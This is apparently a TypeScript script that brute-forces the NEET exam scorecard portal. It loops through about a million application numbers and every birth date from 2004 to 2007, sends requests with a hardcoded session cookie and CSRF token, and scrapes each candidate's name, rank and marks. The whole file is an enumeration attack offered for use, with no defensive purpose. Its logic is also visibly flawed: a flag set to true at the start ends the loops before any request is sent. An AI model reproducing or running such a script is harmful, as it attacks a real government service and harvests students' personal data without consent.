// const axios = require("axios");
import axios from "axios";
// const qs = require("qs");
import qs from "qs";
import cheerio from "cheerio";
async function solve(
  appplicationNum: String,
  day: String,
  month: String,
  year: String
) {
  let data = qs.stringify({
    "_csrf-frontend":
      "B7OfdKE9gLPcU_ReFoaoo55y06zn-ZL5MfdvF4WM8l192MYE2Xj2wp8quxNlyO3tzjHklLem3r11jQh78dnGKg==",
    // "Scorecardmodel[ApplicationNumber]": "240411183516",
    // "Scorecardmodel[Day]": "08",
    // "Scorecardmodel[Month]": "03",
    // "Scorecardmodel[Year]": "2007",
    "Scorecardmodel[ApplicationNumber]": appplicationNum,
    "Scorecardmodel[Day]": day,
    "Scorecardmodel[Month]": month,
    "Scorecardmodel[Year]": year,
  });

  let config = {
    method: "post",
    maxBodyLength: Infinity,
    url: "https://neet.ntaonline.in/frontend/web/scorecard/index",
    headers: {
      Accept:
        "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
      "Accept-Language": "en-US,en;q=0.9",
      "Cache-Control": "max-age=0",
      Connection: "keep-alive",
      "Content-Type": "application/x-www-form-urlencoded",
      Cookie:
        "advanced-frontend=1i88t9cen58kl03mmsjncssm7k; _csrf-frontend=c75db5b2e9d70e7c06a236e4426d69b88b028ec64b2437383befa15c0f3f189ba%3A2%3A%7Bi%3A0%3Bs%3A14%3A%22_csrf-frontend%22%3Bi%3A1%3Bs%3A32%3A%22zkYpxEvqCyOMsNENPC78P_LDDzgltU4w%22%3B%7D",
      Origin: "null",
      "Sec-Fetch-Dest": "document",
      "Sec-Fetch-Mode": "navigate",
      "Sec-Fetch-Site": "same-origin",
      "Sec-Fetch-User": "?1",
      "Upgrade-Insecure-Requests": "1",
      "User-Agent":
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
      "sec-ch-ua":
        '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
      "sec-ch-ua-mobile": "?0",
      "sec-ch-ua-platform": '"macOS"',
    },
    data: data,
  };
  try {
    const response = await axios.request(config);
    // console.log(JSON.stringify(response.data));
    const parsedData: any = parseHTML(JSON.stringify(response.data));
    if (parsedData) {
      // console.log("test", parsedData);
      return parsedData;
    }
    // .then((response) => {
    //   console.log(JSON.stringify(response.data));
    // })
    // .catch((error) => {
    //   console.log(error);
    // });
  } catch (e) {
    return null;
  }
}

function parseHTML(htmlcontent: string) {
  const $ = cheerio.load(htmlcontent);

  const applicationNumber =
    $('td:contains("Application No.")').next("td").text().trim() || "NA";
  const candidateName =
    $('td:contains("Candidate’s Name")').next("td").text().trim() || "NA";

  const allIndiaRank =
    $('td:contains("NEET All India Rank")').next("td").text().trim() || "NA";
  const marks =
    $('td:contains("Total Marks Obtained (out of 720)")')
      .first()
      .next("td")
      .text()
      .trim() || "NA";

  if (allIndiaRank == "N/A") {
    return null;
  }

  return {
    applicationNumber,
    candidateName,
    allIndiaRank,
    marks,
  };
}

// solve("240411183516", "08", "03", "2007");

async function main(rollNumber: string) {
  let solved = true; //breaking iteration for the roll  number once result is found
  for (let year = 2007; year >= 2004; year--) {
    if (solved) {
      break;
    }
    for (let month = 1; month <= 12; month++) {
      if (solved) {
        break;
      }

      console.log("req for", month, "for year", year);
      let dataPromises = [];
      for (let day = 1; day <= 31; day++) {
        // const data: any = await solve(
        //   rollNumber,
        //   day.toString(),
        //   month.toString(),
        //   year.toString()
        // );
        const dataPromise: any = solve(
          rollNumber,
          day.toString(),
          month.toString(),
          year.toString()
        );
        dataPromises.push(dataPromise);
        // if (data.applicationNumber != "NA") {
        //   console.log("dates", rollNumber, day, month, year);
        //   console.log("this is correct res", data);
        //   process.exit(1);
        // }
      }
      const resolvedData = await Promise.all(dataPromises);
      resolvedData.forEach((data) => {
        if (data.applicationNumber != "NA") {
          console.log("this is correct res", data);
          solved = true;
          // process.exit(1);
        }
      });
    }
  }
}
// main("240411183518");

async function solveAllApplications() {
  for (let i = 240411000000; i < 240411999999; i++) {
    await main(i.toString());
  }
}

solveAllApplications();
